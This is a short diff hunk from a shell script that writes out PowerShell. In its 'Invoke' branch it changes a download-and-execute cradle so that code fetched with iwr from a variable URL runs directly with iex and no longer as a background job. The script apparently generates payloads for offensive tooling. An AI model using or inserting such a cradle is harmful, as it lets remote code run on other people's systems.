@@ -71,13 +71,11 @@ EOF
             ;;
         "Invoke")
             cat <<EOF
-    Start-Job -ScriptBlock (
-        [scriptblock]::Create(
-            [System.Text.Encoding]::ASCII.GetString(
-                (
-                    iwr -DisableKeepAlive -UseBasicParsing $url/$path
-                ).content
-            )
+    iex (
+        [System.Text.Encoding]::ASCII.GetString(
+            (
+                iwr -DisableKeepAlive -UseBasicParsing $url/$path
+            ).content
         )
     )
 }
